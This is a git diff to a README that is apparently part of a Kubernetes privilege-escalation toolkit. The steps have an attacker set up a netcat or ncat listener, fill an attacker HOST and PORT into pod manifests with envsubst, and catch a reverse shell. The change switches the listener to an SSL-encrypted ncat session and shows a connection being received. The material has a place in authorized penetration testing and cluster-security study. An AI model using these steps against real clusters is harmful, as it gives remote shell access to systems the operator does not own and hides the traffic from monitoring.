@@ -50,7 +50,7 @@ Create one or more of these resources and catch the reverse shell
 
 **Step 1: Set up listener**
 ```bash
-nc -nvlp 3116
+ncat --ssl -vlp 3116
 ```
 
 **Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**
@@ -64,8 +64,10 @@ HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/hostnetwork/[RESOURCE_TYPE]/h
 
 **Step 3: Catch the shell**
 ```bash
-$ nc -nvlp 3116
-Listening on 0.0.0.0 3116
+$ ncat --ssl -vlp 3116
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: Listening on :::3116
+Ncat: Listening on 0.0.0.0:3116
 Connection received on 10.0.0.162 42035
 ```
 
